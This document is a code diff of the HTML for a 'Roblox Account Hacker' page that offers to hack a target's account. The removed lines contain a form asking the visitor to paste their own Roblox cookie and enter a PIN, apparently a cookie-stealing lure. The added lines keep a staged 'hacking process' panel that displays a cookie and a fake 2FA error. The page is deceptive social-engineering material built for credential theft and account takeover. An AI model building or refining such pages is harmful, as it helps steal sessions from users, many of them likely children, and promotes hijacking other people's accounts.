@@ -9,32 +9,38 @@
 <body>
   <div class="container">
     <h1>Roblox Account Hacker</h1>
-    <p>Enter the target's Roblox username or User ID:</p>
-    <input type="text" id="username" placeholder="Username or User ID">
-    <button onclick="startHack()">Start Hacking</button>
+    <p>Enter the target's Roblox User ID or Username:</p>
+    <input type="text" id="userId" placeholder="User ID or Username">
+    <button onclick="fetchProfile()">Scan Account</button>
 
-    <!-- Progress bar and terminal -->
-    <div id="progress" class="hidden">
+    <div id="profile" class="hidden">
+      <h2>Profile Data</h2>
+      <div class="profile-info">
+        <img id="avatar" src="" alt="Profile Picture">
+        <div class="details">
+          <p id="username"></p>
+          <p id="displayName"></p>
+          <p id="friends"></p>
+          <p id="followers"></p>
+          <p id="following"></p>
+          <p id="robux"></p>
+          <p id="rareItems"></p>
+        </div>
+      </div>
+    </div>
+
+    <div id="error" class="hidden">
+      <p class="error-message">ERROR! Invalid User ID or Username.</p>
+    </div>
+
+    <div id="hacking" class="hidden">
+      <h2>Hacking Process</h2>
       <div class="progress-bar">
         <div id="progress-bar-fill"></div>
       </div>
       <pre id="terminal"></pre>
-    </div>
-
-    <!-- Cookie input section -->
-    <div id="cookieInputSection" class="hidden">
-      <p>Please enter your Roblox cookie to proceed:</p>
-      <input type="text" id="cookieInput" placeholder="Enter Roblox Cookie">
-      <button onclick="submitCookie()">Submit</button>
-      <p id="cookieError" class="error-message"></p>
-    </div>
-
-    <!-- PIN input section (optional) -->
-    <div id="error" class="hidden">
-      <p>Hacking failed! The target account has enhanced security.</p>
-      <p>Please enter the account's 4-digit PIN to continue:</p>
-      <input type="text" id="pin" placeholder="Enter PIN">
-      <button onclick="submitPin()">Submit</button>
+      <p id="cookie"></p>
+      <p id="twoFaError" class="error-message">ERROR! User has 2FA enabled. Full access prevented.</p>
     </div>
   </div>
 
